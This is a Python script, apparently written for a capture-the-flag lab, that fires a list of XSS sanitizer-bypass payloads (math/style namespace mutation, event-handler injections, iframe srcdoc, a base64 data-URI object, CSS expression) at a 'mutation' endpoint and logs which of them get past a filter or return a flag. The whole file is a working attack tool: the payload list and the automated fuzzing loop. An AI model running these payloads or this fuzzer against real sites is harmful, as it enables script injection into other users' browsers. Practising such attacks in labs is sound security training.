import requests
import urllib.parse
import re
import time

URL = "https://xss2.dsa.linti.unlp.edu.ar/mutation?payload="
HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

payloads = [
    '<math></br><style><a id="x"></style><img src=x onerror=alert(1)>',
    '<math></br><style><a id="x" onclick=alert(1)></style><p>Test</p>',
    '<math></br><style><a id="x" onmouseover=alert(1)></style><div>Hover</div>',
    '<math></br><style><a id="x"><style><img src=x onerror=alert(1)></style>',
    '<math></br><style><a id="x" style="background:url(javascript:alert(1))"></style>',
    '<math><style><a id="x"><img src=x onerror=alert(1)></a></style>',
    '<math><style><a id="x"><svg onload=alert(1)></svg></a></style>',
    '<math><style><a id="x"><iframe srcdoc="<script>alert(1)</script>"></iframe></a></style>',
    '<math><style><a id="x"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object></a></style>',
    '<math><style><a id="x" style="x:expression(alert(1))"></style>',
]

log_file = open("xss_log.txt", "w", encoding="utf-8")

def log_result(message):
    print(message)
    log_file.write(message + "\n")

def check_response(content, payload):
    if "flag{" in content.lower() or "FLAG{" in content:
        log_result(f"[✅ FLAG FOUND] Payload: {payload}")
        return True
    elif "I don't like that attack vector" not in content:
        log_result(f"[⚠️ POSSIBLE BYPASS] Payload: {payload}")
    else:
        log_result(f"[❌ Blocked] Payload: {payload}")
    return False

found_flag = False
for i, raw_payload in enumerate(payloads):
    encoded = urllib.parse.quote(raw_payload)
    full_url = URL + encoded
    try:
        response = requests.get(full_url, headers=HEADERS, timeout=10)
        found_flag = check_response(response.text, raw_payload) or found_flag
        time.sleep(0.5)  # evita sobrecargar el servidor
    except Exception as e:
        log_result(f"[ERROR] Payload {raw_payload} --> {e}")

log_file.close()
if not found_flag:
    print("🔍 No se encontró ninguna flag. Revisá xss_log.txt para más detalles.")
else:
    print("🎉 ¡Se encontró al menos una flag!")

